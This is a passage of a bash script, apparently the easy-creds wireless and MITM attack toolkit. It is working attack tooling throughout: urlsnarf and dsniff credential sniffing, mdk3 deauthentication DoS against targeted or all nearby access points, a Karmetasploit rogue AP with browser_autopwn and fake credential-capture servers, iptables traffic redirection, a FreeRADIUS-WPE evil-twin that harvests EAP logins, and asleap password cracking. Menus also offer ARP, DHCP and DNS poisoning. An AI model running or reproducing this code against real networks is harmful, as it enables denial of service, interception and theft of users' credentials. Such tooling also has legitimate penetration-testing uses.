	y=$((${y}+${yoffset}))
	xterm -geometry "${width}"x${height}-${x}+${y} -T "URL Snarf" -l -lf ${logfldr}/urlsnarf-$(date +%F-%H%M).txt -bg black -fg green -e urlsnarf  -i ${TUNIFACE} &
	sleep 3
elif [ -z ${wireless} ] && [ -z ${isxrunning} ]; then
	screen -S easy-creds -X screen -t URL-Snarf urlsnarf -i ${IFACE}
	screen -S easy-creds -p urlsnarf -X logfile ${logfldr}/urlsnarf-$(date +%F-%H%M).txt
	screen -S easy-creds -p urlsnarf -X log
else
	y=$((${y}+${yoffset}))
	xterm -geometry "${width}"x${height}-${x}+${y} -T "URL Snarf" -l -lf ${logfldr}/urlsnarf-$(date +%F-%H%M).txt -bg black -fg green -e urlsnarf  -i ${IFACE} &
	sleep 3
fi
echo -e "\e[1;34m[*]\e[0m Launching Dsniff..."
if [ "${wireless}" == "1" ] && [ -z ${isxrunning} ]; then
	screen -S easy-creds -X screen -t dsniff dsniff -m -i ${TUNIFACE} -w ${logfldr}/dsniff$(date +%F-%H%M).log
elif [ "$wireless" == "1" ]; then
	y=$((${y}+${yoffset}))
	xterm -geometry "${width}"x${height}-${x}+${y} -T "Dsniff" -bg blue -fg white -e dsniff -m -i ${TUNIFACE} -w ${logfldr}/dsniff$(date +%F-%H%M).log &
	sleep 3
elif [ -z ${wireless} ] && [ -z ${isxrunning} ]; then
	screen -S easy-creds -X screen -t dsniff dsniff -m -i ${IFACE} -w ${logfldr}/dsniff$(date +%F-%H%M).log
else
	y=$((${y}+${yoffset}))
	xterm -geometry "${width}"x${height}-${x}+${y} -T "Dsniff" -bg blue -fg white -e dsniff -m -i ${IFACE} -w ${logfldr}/dsniff$(date +%F-%H%M).log &
	sleep 3
fi
if [ "${SIDEJACK}" == "y" ]; then
	f_sidejack
fi
echo -e "\n\e[1;34m[*]\e[0m Do you ever imagine things in the garden of your mind?"
sleep 5
}
##################################################
f_fakeapeviltwin(){
eviltwin=1
ESSID=default
f_fakeapAttack
}
##################################################
f_mdk3aps(){
	clear
	f_Banner
	dosattack=1
	# grep the MACs to a temp white list
	ifconfig -a| grep wlan| grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}' > /tmp/ec/ec-white.lst
	echo

	read -p "Do you have the BSSID address of the AP you'd like to attack? [y/N]: " havemac
	havemac="$(echo ${havemac} | tr 'A-Z' 'a-z')"
	echo

	if [ "${havemac}" == "y" ]; then
	 unset dosmac
	 while [ -z "${dosmac}" ]; do read -p "Please enter the BSSID address of the AP you wish to DoS: " dosmac; done

	 echo "${dosmac}" > /tmp/ec/ec-dosap
	 airmon-ng | egrep 'wlan|ath' | sed '$a\\n'
	 unset doswlan
	 while [ -z ${doswlan} ];do read -p "Please enter the wireless device to use for DoS attack: " doswlan; done

	 phyint=$(airmon-ng | grep ${doswlan} | sed -n "s/.*\([[].*[]]\).*/\1/;s/[[]//;s/[]]//p;")

	 echo -e "\nPlacing the wireless card in monitor mode to perform DoS attack."
	 airmon-ng start ${doswlan} &
	 sleep 3

	 dosmon=$(airmon-ng | sed -n "s/.*\(mon.*${phyint}\).*/\1/p;" | cut -f1)
	 echo -e "\nUsing ${dosmon} for the attack.\n\n"

	 echo -e "\n\e[1;34m[*]\e[0m Please standby while we DoS the AP with BSSID Address $dosmac..."
	 sleep 3
		if [ -z $isxrunning ]; then
			screen -S easy-creds -X screen -t MDK3-DoS mdk3 ${dosmon} d -b /tmp/ec/ec-dosap
		else
			xterm -geometry "${width}"x${height}+${x}-${y} -T "MDK3 AP DoS" -e mdk3 ${dosmon} d -b /tmp/ec/ec-dosap &
		fi
	 #Get the PID so we can kill it when the user quits the attack
	 ps ax|grep mdk3|grep -v grep|grep -v xterm|cut -d " " -f1 > /tmp/ec/dosap.pid
	 #Sometimes it's field #1 and sometimes #2 not sure why
	 if [ -z $(cat /tmp/ec/dosap.pid) ]; then ps ax|grep mdk3|grep -v grep|grep -v xterm|cut -d " " -f2 > /tmp/ec/dosap.pid;fi
	 echo -e "\n\e[1;34m[*]\e[0m Ctrl-c or close the xterm window to stop the AP DoS attack..."
	else
	 	f_getbssids
	fi
	f_mainmenu
}
##################################################
f_lastman(){
	clear
	f_Banner
	dosattack=1
	echo -e "\n\e[1;34m[*]\e[0m This attack will DoS every AP BSSID & Client MAC it can reach.\n\e[1;31m[*]\e[0m Use with extreme caution\n\n"

	# grep the MACs to a temp white list
	ifconfig | grep wlan| grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}' > /tmp/ec/ec-white.lst

	airmon-ng | egrep '(wlan|mon)' | sed '$a\\n'
	unset doswlan
	while [ -z ${doswlan} ];do read -p "Please enter the wireless device to use for DoS attack: " doswlan; done

	phyint=$(airmon-ng | grep ${doswlan} | sed -n "s/.*\([[].*[]]\).*/\1/;s/[[]//;s/[]]//p;")

	echo -e "\n\e[1;34m[*]\e[0m Placing the wireless card in monitor mode to perform DoS attack."
	airmon-ng start ${doswlan} &> /dev/null
	sleep 3

	dosmon=$(airmon-ng | sed -n "s/.*\(mon.*${phyint}\).*/\1/p;" | cut -f1)
	echo -e "\n\e[1;34m[*]\e[0m Using ${dosmon} for attack."
	echo -e "\n\e[1;34m[*]\e[0m Press ctrl-c to stop the attack..."
	sleep 3

	if [ -z ${isxrunning} ]; then
		screen -S easy-creds -X screen -t Last-Man-Standing mdk3 ${dosmon} d -w /tmp/ec/ec-white.lst;(airmon-ng stop ${airomon} >/dev/null)
	else
		xterm -geometry 70x10+0-0 -T "Last Man Standing" -e mdk3 ${dosmon} d -w /tmp/ec/ec-white.lst;(airmon-ng stop ${airomon} >/dev/null) &
	fi
	sleep 2

	#Get the PID so we can kill it when the user quits the attack
	ps ax|grep mdk3|grep -v grep|grep -v xterm|cut -d " " -f1 > /tmp/ec/dosap.pid
	if [ -z $(cat /tmp/ec/dosap.pid) ]; then ps ax|grep mdk3|grep -v grep|grep -v xterm|cut -d " " -f2 > /tmp/ec/dosap.pid;fi
	f_mainmenu
}
##################################################
f_getbssids(){
	clear
	f_Banner
	echo -e "\n\e[1;34m[*]\e[0m This will launch airodump-ng and allow you to specify the AP to DoS"

	airmon-ng | grep wlan | sed '$a\\n'
	unset airowlan
	while [ -z ${airowlan} ];do read -p "Please enter the wireless device to use for DoS attack: " airowlan; done

	phyint=$(airmon-ng | grep ${airowlan} | sed -n "s/.*\([[].*[]]\).*/\1/;s/[[]//;s/[]]//p;")

	echo -e "\n\e[1;34m[*]\e[0m Placing the wireless card in monitor mode to perform DoS attack."
	airmon-ng start ${airowlan} > /dev/null &
	sleep 3

	airomon=$(airmon-ng | sed -n "s/.*\(mon.*${phyint}\).*/\1/p;" | cut -f1)

	echo -e "\n\e[1;34m[*]\e[0m Starting airodump-ng with $airomon, [ctrl+c] in the window when you see the ESSID(s) you want to attack.\e[0m"

	if [ -z ${isxrunning} ]; then
		screen -S easy-creds -X screen -t Airodump airodump-ng ${airomon} -w /tmp/ec/airodump-ec --output-format csv
	else
		xterm -geometry 90x25+0+0 -T "Airodump" -e airodump-ng ${airomon} -w /tmp/ec/airodump-ec --output-format csv &
	fi
	echo $! > /tmp/ec/airodump.pid
	#wait for the process to die
	while [ ! -z $(ps -p "$(cat /tmp/ec/airodump.pid)" | grep "$(cat /tmp/ec/airodump.pid)" | sed 's/ //g') ]; do sleep 3; done
	sleep 3

	#sometimes the mon interface doesn't transition properly after airodump, decided to stop the interface and restart it clean
	airmon-ng stop ${airomon} &> /dev/null

	echo -e "\n\e[1;34mThe following APs were identified:\e[0m"

	#IFS variable allows for spaces in the name of the ESSIDs and will still display it on one line
	SAVEIFS=${IFS}
	IFS=$(echo -en "\n\b")
	for apname in $(cat /tmp/ec/airodump-ec-01.csv | egrep -a '(OPN|MGT|WEP|WPA)'| cut -d "," -f14|sed '/^$/d'|sed -e 's/^[ \t]*//'|sort -u);do
		echo -e "\e[1;34m[*]\e[0m ${apname}"
	done
	echo

	IFS=${SAVEIFS}
	unset dosapname
	while [ -z ${dosapname} ]; do
	 read -p "Please enter the ESSID you'd like to attack: " dosapname
	done

	cat /tmp/ec/airodump-ec-01.csv | egrep -a '(OPN|MGT|WEP|WPA)'| grep -a -i "${dosapname}" |cut -d "," -f1 > /tmp/ec/ec-macs
	rm /tmp/ec/airodump-ec*

	#Make sure none of your MACs end up in the blacklist
	diff -i /tmp/ec/ec-macs /tmp/ec/ec-white.lst | grep -v ">"|grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}' > /tmp/ec/ec-dosap

	echo -e "\n\e[1;34m[*]\e[0m Now Deauthing clients from ${dosapname}.\n\t-If there is more than one BSSID, all will be attacked...\e"
	airmon-ng start ${airowlan} &> /dev/null
	sleep 3

	if [ -z ${isxrunning} ]; then
		echo -e "\e[1;34m[*]\e[0m ctrl-c the screen terminal to stop the attack"
		sleep 5
		screen -S easy-creds -X screen -t MDK3-AP-DoS mdk3 ${airomon} d -b /tmp/ec/ec-dosap;(airmon-ng stop ${airomon} >/dev/null)
	else
		echo -e "\e[1;34m[*]\e0m close the xterm window to stop the attack..."
		xterm -geometry 70x10+0-0 -T "MDK3 AP DoS" -e mdk3 ${airomon} d -b /tmp/ec/ec-dosap;(airmon-ng stop ${airomon} >/dev/null) &
	fi
}
##################################################
f_KarmaAttack(){
# Credit to Metasploit Unleashed, used as a base
wireless=1
karmasploit=1
clear
f_Banner
f_xtermwindows

echo -e "Network Interfaces:\n"
ifconfig | awk '/Link encap:Eth/ {print;getline;print}' | sed '{ N; s/\n/ /; s/Link en.*.HWaddr//g; s/ Bcast.*//g; s/UP.*.:1//g; s/inet addr/IP/g; }' | sed '$a\\n'

while [ -z ${IFACE} ]; do read -p "Interface connected to the internet, example eth0: " IFACE; done
airmon-ng
while [ -z ${WIFACE} ]; do read -p "Wireless interface name, example wlan0: " WIFACE; done
airmon-ng start ${WIFACE} &> /dev/null
modprobe tun
echo -e "\n\e[1;34m[*]\e[0m Your interface has now been placed in Monitor Mode\n"
airmon-ng | grep mon | sed '$a\\n'
unset MONMODE
while [ -z ${MONMODE} ]; do read -p "Enter your monitor enabled interface name (ex. mon0): " MONMODE; done
unset TUNIFACE
while [ -z ${TUNIFACE} ]; do read -p "Enter your tunnel interface (ex. at0): " TUNIFACE; done
f_karmadhcp
f_karmasetup
f_karmafinal
f_mainmenu
}
##################################################
f_karmadhcp(){
unset ATCIDR
while [ -z ${ATCIDR} ]; do read -p "Network range for your tunneled interface, example 10.0.0.0/24: " ATCIDR; done
unset ATDNS
while [ -z ${ATDNS} ]; do read -p "Enter the IP address for the DNS server, example 8.8.8.8: " ATDNS; done
f_ipcalc
}
##################################################
f_karmasetup(){
cat <<-EOF > /tmp/ec/karma.rc
	spool ${logfldr}/karma.${DATE}.txt
	use auxiliary/server/browser_autopwn
	setg AUTOPWN_HOST ${ATIP}
	setg AUTOPWN_PORT 55550
	setg AUTOPWN_URI /ads
	set LHOST ${ATIP}
	set LPORT 45000
	set SRVPORT 55550
	set URIPATH /ads
	run
	use auxiliary/server/capture/pop3
	set SRVPORT 110
	set SSL false
	run
	use auxiliary/server/capture/pop3
	set SRVPORT 995
	set SSL true
	run
	use auxiliary/server/capture/ftp
	run
	use auxiliary/server/capture/imap
	set SSL false
	set SRVPORT 143
	run
	use auxiliary/server/capture/imap
	set SSL true
	set SRVPORT 993
	run
	use auxiliary/server/capture/smtp
	set SSL false
	set SRVPORT 25
	run
	use auxiliary/server/capture/smtp
	set SSL true
	set SRVPORT 465
	run
	use auxiliary/server/fakedns
	unset TARGETHOST
	set SRVPORT 5353
	run
	use auxiliary/server/fakedns
	unset TARGETHOST
	set SRVPORT 53
	run
	use auxiliary/server/capture/http
	set SRVPORT 80
	set SSL false
	run
	use auxiliary/server/capture/http
	set SRVPORT 8080
	set SSL false
	run
	use auxiliary/server/capture/http
	set SRVPORT 443
	set SSL true
	run
	use auxiliary/server/capture/http
	set SRVPORT 8443
	set SSL true
	run
EOF
}
##################################################
f_karmafinal(){
echo -e "\e[1;34m[*]\e[0m Launching Airbase..."
# airbase-ng is going to create our fake AP with the SSID default
if [ -z ${isxrunning} ]; then
	screen -dmS easy-creds -t Airbase-NG airbase-ng -P -C 30 -e default -v ${MONMODE}
else
	xterm -geometry "${width}"x${height}-${x}+${y} -T "Airbase-NG" -e airbase-ng -P -C 30 -e "default" -v ${MONMODE} &
fi
sleep 7
ps ax|grep airbase|grep -v grep|grep -v xterm|cut -d " " -f1 > /tmp/ec/ec-karma.pid
if [ -z $(cat /tmp/ec/ec-karma.pid) ]; then ps ax|grep airbase|grep -v grep|grep -v xterm|cut -d " " -f1 > /tmp/ec/ec-karma.pid; fi

echo -e "\e[1;34m[*]\e[0m Configuring tunneled interface."
ifconfig ${TUNIFACE} up
ifconfig ${TUNIFACE} ${ATIP} netmask ${ATSUB}
ifconfig ${TUNIFACE} mtu 1500
route add -net ${ATNET} netmask ${ATSUB} gw ${ATIP} dev ${TUNIFACE}
sleep 3

echo -e "\e[1;34m[*]\e[0m Setting up iptables to handle traffic seen by the tunneled interface."
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
iptables -P FORWARD ACCEPT
iptables -t nat -A POSTROUTING -o ${IFACE} -j MASQUERADE
sleep 3

#Blackhole Routing - Forces clients to go through attacker even if they have cached DNS entries
iptables -t nat -A PREROUTING -i ${TUNIFACE} -j REDIRECT

echo -e "\e[1;34m[*]\e[0m Launching Tail..."
if [ -z ${isxrunning} ]; then
	screen -S easy-creds -t DMESG -X screen tail -f /var/log/messages
else
	y=$((${y}+${yoffset}))
	xterm -geometry "${width}"x${height}-${x}+${y} -T "DMESG" -bg black -fg red -e tail -f /var/log/messages &
fi
sleep 3

#Get the PID so we can kill it when the user quits the attack
ps ax|grep tail|grep -v grep|grep -v xterm|cut -d " " -f1 > /tmp/ec/tail.pid
if [ -z $(cat /tmp/ec/tail.pid) ]; then ps ax|grep tail|grep -v grep|grep -v xterm|cut -d " " -f2 > /tmp/ec/tail.pid; fi
echo -e "\e[1;34m[*]\e[0m DHCP server starting on tunneled interface."
if [ -e /etc/dhcp/dhcpd.conf ]; then
	service isc-dhcp-server start
elif [ -e /etc/dhcp3/dhcpd.conf ]; then
	dhcpd3 -q -cf ${DHCPPATH} -pf /var/run/dhcp3-server/dhcpd.pid ${TUNIFACE} &
elif [ -e /etc/sysconfig/dhcpd ]; then
	systemctl start dhcpd.service
else
	echo -e "\n\e[1;32m[!]\e[0m Couldn't find a DHCP server to start.\n"
fi
sleep 3

if [ -z ${isxrunning} ]; then
	echo -e "\e[1;34m[*]\e[0m Launching Karmetasploit in screen. Once it loads press ctrl-a then d return to this window.\n"
	sleep 5
	screen -S Karmetasploit -t msfconsole msfconsole -r /tmp/ec/karma.rc
else
	echo -e "\e[1;34m[*]\e[0m Launching Karmetasploit, this may take a little bit..."
	y=$((${y}+${yoffset}))
	xterm -geometry "${width}"x${height}-${x}+${y} -bg black -fg white -T "Karmetasploit" -e msfconsole -r /tmp/ec/karma.rc &
fi
sleep 2

#Get the PID so we can kill it when the user quits the attack
ps ax|grep msfconsole|grep -v grep|grep -v xterm|cut -d " " -f1 > /tmp/ec/ec-metasploit.pid
if [ -z $(cat /tmp/ec/ec-metasploit.pid) ]; then ps ax|grep msfconsole|grep -v grep|grep -v xterm|cut -d " " -f2 > /tmp/ec/ec-metasploit.pid; fi
#Enable IP forwarding
echo "1" > /proc/sys/net/ipv4/ip_forward

echo -e "\n\e[1;34m[*]\e[0m Do you ever imagine things in the garden of your mind?"
sleep 5
}
##################################################
f_freeradiusattack(){
clear
f_Banner
fra=1
#installed by user
if [ -e /usr/local/var/log/radius/freeradius-server-wpe.log ] || [ -x /usr/local/sbin/radiusd ]; then
	freeradiuslog=/usr/local/var/log/radius/freeradius-server-wpe.log
	pathtoradiusconf=/usr/local/etc/raddb
#installed by package manager
else
	freeradiuslog=/var/log/radius/freeradius-server-wpe.log
	pathtoradiusconf=/etc/raddb
fi

atheroscard=$(lsmod | grep -c 'ath')
if [ "${atheroscard}" -lt "1" ]; then
	echo -e "\n\e[1;31m[-]\e[0m I could not find and Atheros wireless card.\nAttack only works with an atheros chipset...\n"
	sleep 5
fi

mv ${pathtoradiusconf}/radiusd.conf ${pathtoradiusconf}/radiusd.conf.back 2>&1> /dev/null
mv ${pathtoradiusconf}/clients.conf ${pathtoradiusconf}/clients.conf.back 2>&1> /dev/null

if [ -e ${pathtoradiusconf} ]; then
	cat ${pathtoradiusconf}/radiusd.conf.back | sed -e '/^proxy_request/s/yes/no/' -e 's/\$INCLUDE proxy.conf/#\$INCLUDE proxy.conf/' > ${pathtoradiusconf}/radiusd.conf
else
	while [! -e ${pathtoradiusconf} ] && [ -z ${pathtoradiusconf} ]; do
		echo -e "\n\e[1;31m[-]\e[0m I cannot find your radius.conf file, please provide the path"
		read -e -p ": " pathtoradiusconf
	done
cat "${pathtoradiusconf}" | sed -e '/^proxy_request/s/yes/no/' -e 's/\$INCLUDE proxy.conf/#\$INCLUDE proxy.conf/' > ${pathtoradiusconf}/radiusd.conf
fi

unset radiussecret
while [ -z ${radiussecret} ]; do
	read -p "Please enter the shared secret you'd like to use for the radius connection: " radiussecret
done

f_buildclientsconf
f_hostapd
f_freeradiusfinal
f_mainmenu
}
##################################################
f_buildclientsconf(){
cat <<-EOF > ${pathtoradiusconf}/clients.conf
	client localhost {
		ipaddr = 127.0.0.1
		secret = ${radiussecret}
		require_message_authenticator = no
		nastype = other
	}
	client 192.168.0.0/16 {
		secret = ${radiussecret}
		shortname = testAP
	}
	client 172.16.0.0/12 {
		secret = ${radiussecret}
		shortname = testAP
	}
	client 10.0.0.0/8 {
		secret = ${radiussecret}
		shortname = testAP
	}
EOF
}
##################################################
f_hostapd(){
airmon-ng | grep 'wlan'
unset radwiface
while [ -z ${radwiface} ]; do
	echo -en "\nPlease enter your wirless interface for the attack (ex: wlan0)"
	read -p " : " radwiface
done

unset radssid
while [ -z ${radssid} ]; do
	echo -en "\nPlease enter SSID you'd like to use for the attack (ex: FreeWifi)"
	read -p " : " radssid
done

unset radchannel
while [ -z ${radchannel} ]; do
	echo -en "\nPlease enter the channel you'd like to use for the attack"
	read -p " : " radchannel
done

cat <<-EOF > /tmp/ec/ec-hostapd.conf
	interface=${radwiface}
	driver=nl80211
	ssid=${radssid}
	logger_stdout=-1
	logger_stdout_level=0
	dump_file=/tmp/hostapd.dump
	ieee8021x=1
	eapol_key_index_workaround=0
	own_ip_addr=127.0.0.1
	auth_server_addr=127.0.0.1
	auth_server_port=1812
	auth_server_shared_secret=${radiussecret}
	wpa=1
	hw_mode=g
	channel=${radchannel}
	wpa_pairwise=TKIP CCMP
	wpa_key_mgmt=WPA-EAP
EOF
}
##################################################
f_freeradiusfinal(){
echo -e "\n\e[1;34m[*]\e[0m Launching the FreeRadius server...\n"
if [ ! -z ${isxrunning} ]; then
	xterm -geometry "${width}"x${height}-${x}+${y} -T "Radius Server" -bg white -fg black -e radiusd -X -f &
	echo $! > /tmp/ec/freeradius.pid
	sleep 3
else
	screen -dmS FreeRadius -t Radius-Server radiusd -X -f
	echo $! > /tmp/ec/freeradius.pid
fi

echo -e "\n\e[1;34m[*]\e[0m Launching hostapd...\n"
sleep 3

if [ ! -z ${isxrunning} ]; then
	y=$((${y}+${yoffset}))
	xterm -geometry "${width}"x${height}-${x}+${y} -T "hostapd" -bg black -fg white -e hostapd /tmp/ec/ec-hostapd.conf &
	sleep 3
else
	screen -S FreeRadius -X screen -t Hostapd hostapd /tmp/ec/ec-hostapd.conf
	echo $! > /tmp/ec/hostapd.pid
fi

if [ ! -e ${freeradiuslog} ]; then
	touch ${freeradiuslog}
fi

echo -e "\n\e[1;34m[*]\e[0m Launching credential log file...\n"
sleep 3

if [ ! -z ${isxrunning} ]; then
	y=$((${y}+${yoffset}))
	xterm -geometry "${width}"x${height}-${x}+${y} -T "credentials" -bg black -fg green -hold -l -lf ${logfldr}/freeradius-creds-$(date +%F-%H%M).txt -e tail -f ${freeradiuslog} &
	sleep 3
else
	screen -S FreeRadius -X screen -t credentials tail -f ${freeradiuslog}
	screen -S FreeRadius -p credentials -X logfile ${logfldr}/freeradius-creds-$(date +%F-%H%M).txt
	screen -S FreeRadius -p credentials -X log
	sleep 3
fi
sleep 2

#Get the PID so we can kill it when the user quits the attack
ps ax|grep tail|grep -v grep|grep -v xterm|cut -d " " -f1 > /tmp/ec/tail.pid
if [ -z $(cat /tmp/ec/tail.pid) ] ; then ps ax|grep tail|grep -v grep|grep -v xterm|cut -d " " -f2 > /tmp/ec/tail.pid; fi

tshark -i ${radwiface} -w ${logfldr}/freeradius-creds-$(date +%F-%H%M).dump &> /dev/null &
echo $! > /tmp/ec/tshark.pid
}
##################################################
#
# DATA REVIEW FUNCTIONS
#
##################################################
f_SSLStrip(){
clear
f_Banner
if [ -d ${logfldr} ]; then
	if [[ ! -z $(ls ${logfldr}|grep -i sslstrip) ]]; then
		echo "SSLStrip logs in current log folder:"
  		ls ${logfldr}/sslstrip* 2>/dev/null
  		echo -e "\n"
	fi
fi

if [ -e ${PWD}/strip-accts.txt ]; then rm ${PWD}/strip-accts.txt; fi

unset LOGPATH
while [ -z ${LOGPATH} ] || [ ! -f "${LOGPATH}" ]; do read -e -p "Enter the full path to your SSLStrip log file: " LOGPATH;	done
unset DEFS
while [ -z ${DEFS} ] || [ ! -e "${DEFS}" ]; do
	read -e -p "Enter the full path to your SSLStrip definitions file: " DEFS
done

NUMLINES=$(cat "${DEFS}" | wc -l)
i=1

while [ ${i} -le "${NUMLINES}" ]; do
	VAL1=$(awk -v k=${i} 'FNR == k {print $1}' "$DEFS")
	VAL2=$(awk -v k=${i} 'FNR == k {print $2}' "$DEFS")
	VAL3=$(awk -v k=${i} 'FNR == k {print $3}' "$DEFS")
	VAL4=$(awk -v k=${i} 'FNR == k {print $4}' "$DEFS")
	GREPSTR="$(grep -a ${VAL2} "${LOGPATH}" | grep -a ${VAL3} | grep -a ${VAL4})"

	if [ "${GREPSTR}" ]; then
		echo -n "${VAL1}" "- " >> ${PWD}/strip-accts.txt
		echo "${GREPSTR}" | \
		sed -e 's/.*'${VAL3}'=/'${VAL3}'=/' -e 's/&/ /' -e 's/&.*//' >> ${PWD}/strip-accts.txt
	fi
	i=$[${i}+1]
done

if [ -s ${PWD}/strip-accts.txt ] && [ -z ${isxrunning} ]; then
	cat ${PWD}/strip-accts.txt | less
elif [ -s ${PWD}/strip-accts.txt ] && [ ! -z ${isxrunning} ]; then
	xterm -geometry 80x24-0+0 -T "SSLStrip Accounts" -hold -bg white -fg black -e cat ${PWD}/strip-accts.txt &
else
	echo -e "\n\e[1;31m[-]\e[0m Sorry no credentials captured..."
	sleep 5
fi
f_DataReviewMenu
}
#######################################################
f_dsniff(){
	clear
	f_Banner
	if [ -d ${logfldr} ]; then
	  echo "Dsniff logs in current log folder:"
	  ls ${logfldr}/dsniff* 2>/dev/null
	  echo -e "\n\n"
	fi

	unset DSNIFFPATH
	while [ -z ${DSNIFFPATH} ] || [ ! -f "${DSNIFFPATH}" ]; do
	 read -e -p "Enter the path for your dsniff Log file: " DSNIFFPATH
	done

	dsniff -r ${DSNIFFPATH} >> ${PWD}/dsniff-log.txt
	if [ -z ${isxrunning} ];then
	 cat ${PWD}/dnsiff-log.txt | less
	else
	 xterm -hold -bg blue -fg white -geometry 80x24-0+0 -T "Dsniff Accounts" -e cat ${PWD}/dsniff-log.txt &
	fi
	f_DataReviewMenu
}
##################################################
f_EtterLog(){
clear
f_Banner

if [ -d ${logfldr} ]; then
	echo "Ettercap logs in current log folder:"
	ls ${logfldr}/*.eci 2>/dev/null
	echo -e "\n"
fi

unset ETTERECI
while [ -z ${ETTERECI} ] || [ ! -f "${ETTERECI}" ]; do read -e -p "Enter the full path to your ettercap.eci log file: " ETTERECI; done

etterlog -p "${ETTERECI}" >> ${PWD}/etterlog.txt
if [ -z ${isxrunning} ]; then
	cat ${PWD}/etterlog.txt | less
else
	xterm -hold -bg blue -fg white -geometry 80x24-0+0 -T "Ettercap Accounts" -e cat ${PWD}/etterlog.txt &
fi
f_DataReviewMenu
}
##################################################
f_freeradiuscreds(){
unset credlist
while [ -z "${credlist}" ] && [ ! -e "${credlist}" ]; do
	echo -n -e "\nPlease enter the path to your FreeRadius Attack credential list"
	read -e -p ": " credlist
done

unset wordlist
while [ -z "${wordlist}" ] && [ ! -e "${wordlist}" ]; do
	echo -n -e "\nPlease enter the path to your wordlist"
	read -e -p ": " wordlist
done

echo -n -e "\n\e[1;34m[*]\e[0m Please standby, this may take a while..."

acreds="${PWD}/asleap-creds-$(date +%F-%H%M).txt"
touch ${acreds}

cat ${credlist}|egrep '(username|challenge|response)'|cut -d ":" -f2-|sed -e 's/^[ \t]*//' > /tmp/ec/freeradius-creds.tmp
NUMLINES=$(cat /tmp/ec/freeradius-creds.tmp|wc -l)
i=1

while [ $i -le "${NUMLINES}" ]; do
	username=$(awk NR==${i} /tmp/ec/freeradius-creds.tmp)
	i=$[${i}+1]
	challenge=$(awk NR==${i} /tmp/ec/freeradius-creds.tmp|tr -d '\r')
	i=$[${i}+1]
	response=$(awk NR==${i} /tmp/ec/freeradius-creds.tmp|tr -d '\r')
	i=$[${i}+1]
	echo "Username: ${username}" >> "${acreds}"
	asleap -C ${challenge} -R ${response} -W ${wordlist} | grep "password:"| sed -e 's/[\t ]//g;/^$/d'| sed -e 's/:/: /g' >> "${acreds}"
	echo >> ${acreds}
done

if [ -s ${acreds} ]; then
	echo -n -e "\n\e[1;34m[*]\e[0m Your cracked credentials can be found at ${acreds}..."
else
	echo -n -e "\n\e[1;34m[*]\e[0m I wasn't able to crack any of the passwords..."
	rm ${acreds}
fi
sleep 5
f_DataReviewMenu
}
##################################################
#
# MENU FUNCTIONS
#
##################################################
f_Banner(){
echo -e " ____ ____ ____ ____ ____ ____ ____ ____ ____ ____ "
echo -e "||\e[1;36me\e[0m |||\e[1;36ma\e[0m |||\e[1;36ms\e[0m |||\e[1;36my\e[0m |||\e[1;36m-\e[0m |||\e[1;36mc\e[0m |||\e[1;36mr\e[0m |||\e[1;36me\e[0m |||\e[1;36md\e[0m |||\e[1;36ms\e[0m ||"
echo -e "||__|||__|||__|||__|||__|||__|||__|||__|||__|||__||"
echo -e "|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|"
echo -e "\e[1;33m 	Version 3.8-dev - Garden of New Jersey\e[0m"
echo
echo -e "\e[1;33mAt any time,\e[0m \e[1;36mctrl+c\e[0m \e[1;33m to cancel and return to the main menu\e[0m"
echo
}
##################################################
f_prereqs(){
clear
f_Banner
echo "1.  Edit etter.conf"
echo "2.  Edit etter.dns"
echo "3.  Install karmetasploit prereqs"
echo "4.  Add tunnel interface to dhcp server"
echo "5.  Update Metasploit Framework"
echo "6.  Update Aircrack-ng"
echo "7.  How-to Videos (Launches Web Browser)"
echo "8.  Previous Menu"
echo
read -p "Choice: " prereqschoice

case ${prereqschoice} in
1) f_nanoetter ;;
2) f_nanoetterdns ;;
3) f_karmareqs ;;
4) f_addtunnel ;;
5) f_msfupdate ;;
6) f_aircrackupdate ;;
7) f_howtos ;;
8) f_mainmenu ;;
*) f_prereqs ;;
esac
}
##################################################
f_poisoning(){
clear
f_Banner
echo "1.  Create Victim Host List"
echo "2.  Standard ARP Poison"
echo "3.  Oneway ARP Poison"
echo "4.  DHCP Poison"
echo "5.  DNS Poison"
echo "6.  ICMP Poison"
echo "7.  Previous Menu"
echo
read -p "Choice: " poisoningchoice

case ${poisoningchoice} in
1) f_HostScan ;;
2) f_Standard ;;
3) f_Oneway ;;
4) f_DHCPPoison ;;
5) f_DNSPoison ;;
6) f_ICMP ;;
7) f_mainmenu ;;
*) f_poisoning ;;
esac
}
##################################################
f_fakeapattacks(){
clear
f_Banner
echo "1.  FakeAP Attack Static"
echo "2.  FakeAP Attack EvilTwin"
echo "3.  Karmetasploit Attack"
echo "4.  FreeRadius Attack"
echo "5.  DoS AP Options"
echo "6.  Previous Menu"
echo
read -p "Choice: " fapchoice

case ${fapchoice} in
1) f_fakeapAttack ;;
2) f_fakeapeviltwin ;;
3) f_KarmaAttack ;;
4) f_freeradiusattack ;;
5) f_DoSOptions ;;
6) f_mainmenu ;;
*) f_FakeAP-Menu ;;
esac
}
######################################################
f_DoSOptions(){
clear
f_Banner
echo "1. Attack a Single or Multiple APs"
echo "2. Last Man Standing (Use with Caution)"
echo "3. Previous Menu"
echo
read -p "Choice: " doschoice

case ${doschoice} in
1) f_mdk3aps ;;
2) f_lastman ;;
3) f_fakeapattacks ;;
*) f_DoSOptions ;;
esac
}
######################################################
f_DataReviewMenu(){
clear
f_Banner
echo "1.  Parse SSLStrip log for credentials"
echo "2.  Parse dsniff file for credentials"
echo "3.  Parse ettercap eci file for credentials"
echo "4.  Parse freeradius attack file for credentials"
echo "5.  Previous Menu"
echo
read -p "Choice: " datareviewchoice

case ${datareviewchoice} in
1) f_SSLStrip ;;
2) f_dsniff ;;
3) f_EtterLog ;;
4) f_freeradiuscreds ;;
5) f_mainmenu ;;
*) f_DataReviewMenu ;;
esac
}
##################################################
f_ICMP(){
clear
f_Banner
echo -e "\e[1;31m[-]\e[0m If you are connected to a switch this attack won't work."
echo -e "\e[1;31m[-]\e[0m You must be able to see ALL traffic for this attack to work.\n"
read -p "Do you wish to continue? [y/N]: " icmpswitch

if [ $(echo ${icmpswitch} | tr 'A-Z' 'a-z') == "y" ]; then
	f_ICMPPoison
else
	f_poisoning
fi
}
##################################################
f_mainmenu(){
clear
f_Banner
echo "1.  Prerequisites & Configurations"
echo "2.  Poisoning Attacks"
echo "3.  FakeAP Attacks"
echo "4.  Data Review"
echo "5.  Exit"
